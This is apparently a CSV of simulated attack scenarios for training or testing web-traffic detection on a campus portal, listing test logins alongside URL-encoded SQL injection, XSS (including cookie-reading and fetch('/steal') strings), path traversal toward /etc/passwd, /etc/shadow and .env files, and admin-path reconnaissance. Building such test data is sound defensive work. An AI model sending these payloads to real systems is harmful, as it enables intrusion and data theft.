scenario_id,category,intent_class,email,password,search_keyword,secondary_search_keyword,post_title,post_content,probe_path,ua
S001,sqli,attack,student1@campus.local,Password123!,%27+OR+1%3D1--,%27+UNION+SELECT+NULL--,SQLi probe alpha,SQLi payload OR 1=1 against board search and write path,/api/public/announcements?keyword=%27+OR+1%3D1--,sqlmap/1.8
S002,sqli,attack,student2@campus.local,Password123!,%27+UNION+SELECT+NULL--,%27+UNION+SELECT+username%2Cpassword+FROM+users--,SQLi probe beta,Union select style probe aimed at announcement and board search,/api/public/academic-events?q=%27+UNION+SELECT+NULL--,curl/8.6
S003,sqli,attack,student3@campus.local,Password123!,%27+OR+%271%27%3D%271,%27+OR+SLEEP(5)%23,SQLi probe gamma,Boolean based SQLi probe staged through normal looking requests,/api/board/posts?keyword=%27+OR+%271%27%3D%271,python-requests/2.32
S004,sqli,attack,student4@campus.local,Password123!,1%27+AND+1%3D1--,1%27+AND+1%3D2--,SQLi probe delta,Differential SQLi probe comparing true and false conditions,/api/public/announcements?keyword=1%27+AND+1%3D1--,Mozilla/5.0
S005,sqli,attack,student5@campus.local,Password123!,admin%27%23,%27)+OR+(%271%27%3D%271,SQLi probe epsilon,Hash comment and bracketed SQLi patterns mixed into browsing flow,/api/public/academic-events?q=admin%27%23,Wget/1.21.4
S006,sqli,attack,student1@campus.local,Password123!,%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--,%27+OR+BENCHMARK(1000000%2CSHA1(1))%23,SQLi probe zeta,Time based SQLi strings used to stretch anomaly scoring,/api/board/posts?keyword=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--,Go-http-client/1.1
S007,sqli,attack,student2@campus.local,Password123!,%27+UNION+SELECT+table_name+FROM+information_schema.tables--,%27+UNION+SELECT+schema_name+FROM+information_schema.schemata--,SQLi probe eta,Metadata enumeration payloads reused across board and public reads,/api/public/announcements?keyword=%27+UNION+SELECT+table_name+FROM+information_schema.tables--,sqlmap/1.8
S008,sqli,attack,student3@campus.local,Password123!,%27+OR+1%3D1%23,%27+OR+SLEEP(5)--,SQLi probe theta,MySQL style comments and delay payloads inside student session traffic,/api/public/academic-events?q=%27+OR+1%3D1%23,curl/8.6
S009,sqli,attack,student4@campus.local,Password123!,1%27+ORDER+BY+5--,1%27+GROUP+BY+1%2C2%2C3--,SQLi probe iota,Ordering and grouping probes folded into search endpoints,/api/board/posts?keyword=1%27+ORDER+BY+5--,python-requests/2.32
S010,sqli,attack,student5@campus.local,Password123!,%27+UNION+SELECT+load_file(%27%2Fetc%2Fpasswd%27)--,%27+UNION+SELECT+@@version--,SQLi probe kappa,File read and version discovery payloads used in sequence,/api/public/announcements?keyword=%27+UNION+SELECT+@@version--,Mozilla/5.0
S011,sqli,attack,student1@campus.local,Password123!,%27+OR+exists(select+1+from+users)--,%27+OR+substring(database()%2C1%2C1)%3D%27c%27--,SQLi probe lambda,Existence and substring checks blended into low volume reads,/api/public/academic-events?q=%27+OR+exists(select+1+from+users)--,sqlmap/1.8
S012,sqli,attack,student2@campus.local,Password123!,1%27+UNION+SELECT+NULL%2CNULL--,%27+AND+updatexml(1%2Cconcat(0x7e%2Cuser())%2C1)--,SQLi probe mu,Error based SQLi strings carried through search and probe requests,/api/board/posts?keyword=%27+AND+updatexml(1%2Cconcat(0x7e%2Cuser())%2C1)--,libwww-perl/6.77
S013,xss,attack,student3@campus.local,Password123!,%3Cscript%3Ealert(1)%3C%2Fscript%3E,%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,XSS probe alpha,XSS script tag payload written after reflective search attempt,/api/public/announcements?keyword=%3Cscript%3Ealert(1)%3C%2Fscript%3E,Mozilla/5.0
S014,xss,attack,student4@campus.local,Password123!,%3Csvg%2Fonload%3Dalert(1)%3E,%3Ciframe+src%3Djavascript%3Aalert(1)%3E,XSS probe beta,SVG and iframe payloads reused across browsing and board write,/api/public/academic-events?q=%3Csvg%2Fonload%3Dalert(1)%3E,curl/8.6
S015,xss,attack,student5@campus.local,Password123!,%3Cbody+onload%3Dalert(document.domain)%3E,%3Ca+href%3Djavascript%3Aalert(1)%3Eclick%3C%2Fa%3E,XSS probe gamma,DOM event XSS probes wrapped in normal student activity,/api/board/posts?keyword=%3Cbody+onload%3Dalert(document.domain)%3E,python-requests/2.32
S016,xss,attack,student1@campus.local,Password123!,%3Cdetails+open+ontoggle%3Dalert(1)%3E,%3Cmarquee+onstart%3Dalert(1)%3Etest%3C%2Fmarquee%3E,XSS probe delta,Less common HTML event payloads used for rule diversity,/api/public/announcements?keyword=%3Cdetails+open+ontoggle%3Dalert(1)%3E,Go-http-client/1.1
S017,xss,attack,student2@campus.local,Password123!,%22%3E%3Cscript%3Econfirm(1)%3C%2Fscript%3E,%3Cvideo%3E%3Csource+onerror%3Dalert(1)%3E%3C%2Fvideo%3E,XSS probe epsilon,Broken attribute and media source payloads chained together,/api/public/academic-events?q=%22%3E%3Cscript%3Econfirm(1)%3C%2Fscript%3E,Wget/1.21.4
S018,xss,attack,student3@campus.local,Password123!,%3Cmath%3E%3Cmtext%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E,%3Cobject+data%3Djavascript%3Aalert(1)%3E,XSS probe zeta,Markup heavy XSS patterns included for parser stress,/api/board/posts?keyword=%3Cmath%3E%3Cmtext%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E,libwww-perl/6.77
S019,xss,attack,student4@campus.local,Password123!,%3Cimg+src%3D1+onerror%3Dprompt(1)%3E,%3Csvg%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3C%2Fsvg%3E,XSS probe eta,Prompt and nested SVG script payloads ride on board searches,/api/public/announcements?keyword=%3Cimg+src%3D1+onerror%3Dprompt(1)%3E,curl/8.6
S020,xss,attack,student5@campus.local,Password123!,%3Cform%3E%3Cbutton+formaction%3Djavascript%3Aalert(1)%3E,%3Cinput+autofocus+onfocus%3Dalert(1)%3E,XSS probe theta,Form and autofocus handlers increase XSS family coverage,/api/public/academic-events?q=%3Cinput+autofocus+onfocus%3Dalert(1)%3E,Mozilla/5.0
S021,xss,attack,student1@campus.local,Password123!,%3Cscript%3Efetch('/steal')%3C%2Fscript%3E,%3Cimg+src%3Dxx+onerror%3Dconfirm(document.cookie)%3E,XSS probe iota,Exfiltration flavored script strings appear in two channels,/api/board/posts?keyword=%3Cscript%3Efetch('/steal')%3C%2Fscript%3E,python-requests/2.32
S022,xss,attack,student2@campus.local,Password123!,%3Csvg%2Fonload%3DsetTimeout(alert%2C1)%3E,%3Cstyle%3Ebody%7Bbackground:url(javascript:alert(1))%7D%3C%2Fstyle%3E,XSS probe kappa,Timer and style based XSS variants close the training set,/api/public/announcements?keyword=%3Csvg%2Fonload%3DsetTimeout(alert%2C1)%3E,Go-http-client/1.1
S023,path_traversal,attack,student3@campus.local,Password123!,..%2F..%2F..%2F..%2Fetc%2Fpasswd,..%255c..%255c..%255cboot.ini,Traversal probe alpha,Unix traversal payloads pushed through search and probe path,/download?file=../../../../etc/passwd,curl/8.6
S024,path_traversal,attack,student4@campus.local,Password123!,..%2F..%2F..%2F..%2Fwindows%2Fwin.ini,%2e%2e%2f%2e%2e%2fsecret.txt,Traversal probe beta,Windows and dot encoded traversal variants inside public APIs,/api/public/announcements?file=..%2F..%2F..%2F..%2Fwindows%2Fwin.ini,python-requests/2.32
S025,path_traversal,attack,student5@campus.local,Password123!,..%2F..%2F..%2F..%2Fetc%2Fshadow,....//....//....//etc/passwd,Traversal probe gamma,Shadow file and overlong slash traversal attempts chained,/api/public/academic-events?q=..%2F..%2F..%2F..%2Fetc%2Fshadow,Mozilla/5.0
S026,path_traversal,attack,student1@campus.local,Password123!,..%2F..%2Fapp.properties,%252e%252e%252f%252e%252e%252fetc%252fpasswd,Traversal probe delta,Application config and double encoded traversal pair,/static/../../../../etc/passwd,Wget/1.21.4
S027,path_traversal,attack,student2@campus.local,Password123!,..%2F..%2F..%2FWEB-INF%2Fweb.xml,..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron,Traversal probe epsilon,Java web XML and proc environ probes mixed into board flow,/api/board/posts?keyword=..%2F..%2F..%2FWEB-INF%2Fweb.xml,Go-http-client/1.1
S028,path_traversal,attack,student3@campus.local,Password123!,..%255c..%255c..%255cwindows%255csystem.ini,%2e%2e%5c%2e%2e%5cboot.ini,Traversal probe zeta,Backslash encoded Windows traversal strings for parser coverage,/api/public/announcements?keyword=..%255c..%255c..%255cwindows%255csystem.ini,libwww-perl/6.77
S029,path_traversal,attack,student4@campus.local,Password123!,..%2F..%2F..%2F..%2Fvar%2Flog%2Fmessages,..%2F..%2F..%2F..%2Fhome%2Fapp%2F.env,Traversal probe eta,Log and hidden env file traversal strings in one session,/assets/..%2F..%2F..%2F..%2Fetc%2Fpasswd,curl/8.6
S030,path_traversal,attack,student5@campus.local,Password123!,%2e%2e%2f%2e%2e%2f%2e%2e%2fsecret.txt,%252e%252e%252fconfig.yml,Traversal probe theta,Relative path escape attempts with encoded suffix variations,/api/public/academic-events?q=%2e%2e%2f%2e%2e%2f%2e%2e%2fsecret.txt,python-requests/2.32
S031,path_traversal,attack,student1@campus.local,Password123!,....//....//....//etc/passwd,..%2F..%2F..%2F..%2Fopt%2Fapp%2Fsecrets.yml,Traversal probe iota,Overlong traversal probe followed by YAML secret path lookup,/files?name=....//....//....//etc/passwd,Mozilla/5.0
S032,path_traversal,attack,student2@campus.local,Password123!,%252e%252e%252f%252e%252e%252fetc%252fpasswd,..%2F..%2F..%2F..%2Fnginx%2Fnginx.conf,Traversal probe kappa,Double encoded traversal combined with nginx config discovery,/api/board/posts?keyword=%252e%252e%252f%252e%252e%252fetc%252fpasswd,Wget/1.21.4
S033,scan,attack,student3@campus.local,Password123!,admin,administrator,Scan probe alpha,Recon session looking for classic admin endpoints,/admin,Nikto/2.5.0
S034,scan,attack,student4@campus.local,Password123!,wp-login.php,wp-admin,Scan probe beta,Recon session targeting WordPress login and admin paths,/wp-login.php,sqlmap/1.8
S035,scan,attack,student5@campus.local,Password123!,backup.zip,.env,Scan probe gamma,Recon session requesting backup archives and hidden env files,/backup.zip,python-requests/2.32
S036,scan,attack,student1@campus.local,Password123!,phpmyadmin,server-status,Scan probe delta,Recon session combining phpMyAdmin and status page discovery,/phpmyadmin/,curl/8.6
S037,scan,attack,student2@campus.local,Password123!,actuator,health,Scan probe epsilon,Recon session checking actuator and health exposure,/actuator/health,Mozilla/5.0
S038,scan,attack,student3@campus.local,Password123!,git,config,Scan probe zeta,Recon session checking exposed git metadata path,/.git/config,Wget/1.21.4
S039,scan,attack,student4@campus.local,Password123!,administrator,admin-console,Scan probe eta,Recon session probing alternate admin console names,/administrator,Go-http-client/1.1
S040,scan,attack,student5@campus.local,Password123!,wp-admin,index.php?author=1,Scan probe theta,Recon session with WordPress admin and author enumeration flavor,/wp-admin/,Nikto/2.5.0
S041,scan,attack,student1@campus.local,Password123!,config.yml,settings.php,Scan probe iota,Recon session hunting config files and CMS leftovers,/config.yml,curl/8.6
S042,scan,attack,student2@campus.local,Password123!,server-status,nginx_status,Scan probe kappa,Recon session validating exposed status endpoints,/server-status,kube-probe/1.30
